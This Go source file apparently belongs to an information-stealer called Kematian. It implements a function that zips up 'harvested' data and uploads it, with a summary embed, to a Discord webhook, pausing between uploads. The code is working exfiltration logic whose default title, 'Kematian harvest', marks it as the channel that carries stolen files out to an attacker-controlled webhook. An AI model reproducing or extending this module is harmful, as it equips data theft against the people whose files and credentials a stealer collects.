package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"time"
)

type discordEmbed struct {
	Title       string `json:"title"`
	Description string `json:"description"`
	Color       int    `json:"color"`
}

type discordPayload struct {
	Content string         `json:"content,omitempty"`
	Embeds  []discordEmbed `json:"embeds,omitempty"`
}

const discordUploadGap = 1500 * time.Millisecond

func discordUploadDelay() {
	time.Sleep(discordUploadGap)
}

func sendDiscordWebhook(webhookURL, title, summary string, zipData []byte, filename string) error {
	if webhookURL == "" {
		return fmt.Errorf("discord webhook URL is required")
	}
	if len(zipData) == 0 {
		return fmt.Errorf("empty upload archive")
	}
	if title == "" {
		title = "Kematian harvest"
	}

	payload := discordPayload{
		Embeds: []discordEmbed{{
			Title:       title,
			Description: summary,
			Color:       0xE11D48,
		}},
	}
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	var body bytes.Buffer
	w := multipart.NewWriter(&body)

	if err := w.WriteField("payload_json", string(payloadJSON)); err != nil {
		return err
	}

	part, err := w.CreateFormFile("files[0]", filename)
	if err != nil {
		return err
	}
	if _, err := part.Write(zipData); err != nil {
		return err
	}
	if err := w.Close(); err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, webhookURL, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		msg, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return fmt.Errorf("discord webhook HTTP %d: %s", resp.StatusCode, string(msg))
	}
	return nil
}